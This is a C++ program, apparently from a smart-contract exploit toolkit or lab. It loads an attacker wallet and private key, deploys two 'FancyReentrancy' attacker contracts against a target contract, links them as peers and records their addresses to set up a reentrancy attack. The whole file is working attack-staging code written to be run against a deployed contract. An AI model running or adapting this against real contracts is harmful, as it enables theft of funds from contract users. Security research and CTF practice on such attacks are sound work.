#include <chrono>
#include <cstring>
#include <future>
#include <map>
#include <string>
#include <thread>
#include <vector>
#include <openssl/rand.h>
#include <spdlog/spdlog.h>
#include "dotenv.h"

import evm_utils;

static std::string getPeerAddress(const std::string_view rpcEndpoint, const std::string_view contractAddress) {
    try {
        AddressValidator::validateOrThrow(contractAddress, "getPeer contract");
        constexpr std::string_view functionSignature = "getPeer()";
        const auto functionSelector
                = evm_codec::FunctionEncoder::encodeFunctionSelector(std::string{functionSignature}, keccakHash);
        const auto result = callReadFunction(rpcEndpoint, contractAddress, functionSelector);
        if (result.length() < MIN_ENCODED_RESULT_LENGTH || !result.starts_with("0x")) {
            return "0x0000000000000000000000000000000000000000";
        }
        return evm_codec::FunctionDecoder::decodeAddress(result);
    } catch (const std::exception &) {
        return "0x0000000000000000000000000000000000000000";
    }
}

static std::future<std::string> setPeerTx(const std::string_view rpcEndpoint, const SecureString &privateKey,
                                          const uint64_t chainId, const std::string_view contractAddress,
                                          const std::string_view peerAddress, const std::string_view senderAddress) {
    AddressValidator::validateOrThrow(contractAddress, "contract address");
    AddressValidator::validateOrThrow(peerAddress, "peer address");
    AddressValidator::validateOrThrow(senderAddress, "sender");
    return std::async(std::launch::async, [=, &privateKey]() -> std::string {
        const uint64_t txNonce = g_nonceManager.allocateNonce();
        const auto nonceStr = formatHexValue(txNonce);
        const auto [maxPriorityFeePerGas, maxFeePerGas] = getGasFees(rpcEndpoint);
        const auto encodedCall = evm_codec::FunctionEncoder::encodeFunctionCall("setPeer(address)", {"address"},
                                                                                {std::string(peerAddress)}, keccakHash);
        const auto gasLimit = [&]() -> std::string {
            try {
                const auto estimate = estimateTxGas(rpcEndpoint, senderAddress, contractAddress, "0x0", encodedCall);
                const auto gasInt = evm_codec::safeHexToUint64(estimate);
                return formatHexValue(static_cast<uint64_t>(static_cast<double>(gasInt) * GAS_LIMIT_BUFFER));
            } catch (const std::exception &e) {
                spdlog::warn("Gas estimation failed for setPeer, using fallback: {}", e.what());
                return FALLBACK_SETPEER_GAS;
            }
        }();
        const auto signedTx = createSignedTx(privateKey, chainId, nonceStr, maxPriorityFeePerGas, maxFeePerGas, gasLimit,
                                             contractAddress, "0x0", encodedCall);
        const auto txHash = sendRawTx(rpcEndpoint, signedTx).get();
        g_nonceManager.confirmNonce(txNonce + 1);
        return txHash;
    });
}

int main() {
    try {
        spdlog::set_level(spdlog::level::info);
        constexpr std::string_view envFile = "../.env";
        dotenv::init(envFile.data());
        const auto chainIdStr = dotenv::getenv("CHAIN_ID");
        const uint64_t chainId = std::stoull(chainIdStr);
        const auto rpcEndpoint = dotenv::getenv("RPC_URL");
        const auto attackerAddress = dotenv::getenv("ATTACKER_ADDRESS");
        const auto targetContract = dotenv::getenv("TARGET_CONTRACT");
        if (chainIdStr.empty() || rpcEndpoint.empty() || attackerAddress.empty() || targetContract.empty()) {
            throw std::runtime_error("Required environment variables not found");
        }
        const auto privateKey = loadPrivateKey("ATTACKER_PRIVATE_KEY");
        AddressValidator::validateOrThrow(attackerAddress, "attacker wallet");
        AddressValidator::validateOrThrow(targetContract, "target contract");
        auto bytecodeLoad = std::async(std::launch::async, [] { return loadBytecode("FancyReentrancy_bytecode.json"); });
        auto balanceLoad = std::async(std::launch::async, [&] { return getAccountBalance(rpcEndpoint, attackerAddress); });
        auto nonceLoad = std::async(std::launch::async, [&] { return getAddressNonce(rpcEndpoint, attackerAddress); });
        const auto accountBalance = balanceLoad.get();
        const auto currentNonceStr = nonceLoad.get();
        const uint64_t balanceInt = evm_codec::safeHexToUint64(accountBalance);
        const double balanceEth = weiToEth(balanceInt);
        spdlog::info("- ATTACKER CONTRACTS DEPLOYMENT -");
        spdlog::info("Attacker wallet balance: {:.2f} ETH", balanceEth);
        if (balanceInt == 0) {
            throw std::runtime_error("Account has zero balance");
        }
        const auto chainNonce = evm_codec::safeHexToUint64(currentNonceStr);
        g_nonceManager.setCurrentAddress(attackerAddress);
        g_nonceManager.initialize(attackerAddress, chainNonce);
        const auto bytecode = bytecodeLoad.get();
        const std::vector<std::string> constructorTypes = {"address"};
        const std::vector constructorValues = {targetContract};
        spdlog::info("Deploying attacker contracts...");
        auto deployment1 = executeDeployment(rpcEndpoint, privateKey, attackerAddress, chainId, bytecode, constructorTypes,
                                             constructorValues);
        auto deployment2 = executeDeployment(rpcEndpoint, privateKey, attackerAddress, chainId, bytecode, constructorTypes,
                                             constructorValues);
        const auto [success1, response1] = deployment1.get();
        const auto [success2, response2] = deployment2.get();
        if (!success1 || !success2) {
            if (!success1) {
                spdlog::error("First deployment failed: {}", response1["error"].get<std::string>());
            }
            if (!success2) {
                spdlog::error("Second deployment failed: {}", response2["error"].get<std::string>());
            }
            throw std::runtime_error("Contracts deployment failed");
        }
        const auto contractAddress1 = response1["contractAddress"].get<std::string>();
        const auto contractAddress2 = response2["contractAddress"].get<std::string>();
        spdlog::info("Contract 1: {} (tx: {})", contractAddress1, response1["txHash"].get<std::string>());
        spdlog::info("Contract 2: {} (tx: {})", contractAddress2, response2["txHash"].get<std::string>());
        spdlog::info("Adding attacker contracts to the .env file...");
        if (!updateEnvFile(envFile,
                           {{"ATTACKER_CONTRACT_1", contractAddress1}, {"ATTACKER_CONTRACT_2", contractAddress2}})) {
            throw std::runtime_error("Failed to update .env file");
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
        const auto latestNonce = getAddressNonce(rpcEndpoint, attackerAddress);
        g_nonceManager.reset(evm_codec::safeHexToUint64(latestNonce));
        spdlog::info("- SET ATTACKER PEERS -");
        auto setPeer1 = setPeerTx(rpcEndpoint, privateKey, chainId, contractAddress1, contractAddress2, attackerAddress);
        auto setPeer2 = setPeerTx(rpcEndpoint, privateKey, chainId, contractAddress2, contractAddress1, attackerAddress);
        const auto setPeerTx1 = setPeer1.get();
        const auto setPeerTx2 = setPeer2.get();
        spdlog::info("setPeer tx 1: {}", setPeerTx1);
        spdlog::info("setPeer tx 2: {}", setPeerTx2);
        auto confirmation1 = waitForConfirmation(rpcEndpoint, setPeerTx1);
        auto confirmation2 = waitForConfirmation(rpcEndpoint, setPeerTx2);
        if (!confirmation1.get() || !confirmation2.get()) {
            throw std::runtime_error("setPeer transaction confirmation failed");
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
        spdlog::info("Verifying peer addresses...");
        auto peerCheck1 = std::async(std::launch::async, [&] { return getPeerAddress(rpcEndpoint, contractAddress1); });
        auto peerCheck2 = std::async(std::launch::async, [&] { return getPeerAddress(rpcEndpoint, contractAddress2); });
        const auto peer1 = peerCheck1.get();
        const auto peer2 = peerCheck2.get();
        const bool peersValid = peer1 == contractAddress2 && peer2 == contractAddress1;
        spdlog::info("Contract 1 peer: {} [{}]", peer1, peersValid ? "✓" : "✗");
        spdlog::info("Contract 2 peer: {} [{}]", peer2, peersValid ? "✓" : "✗");
        if (!peersValid) {
            throw std::runtime_error("Peer verification failed");
        }
        std::cout << '\n';
        return 0;
    } catch (const std::exception &e) {
        spdlog::error("Critical error: {}", e.what());
        return 1;
    }
}
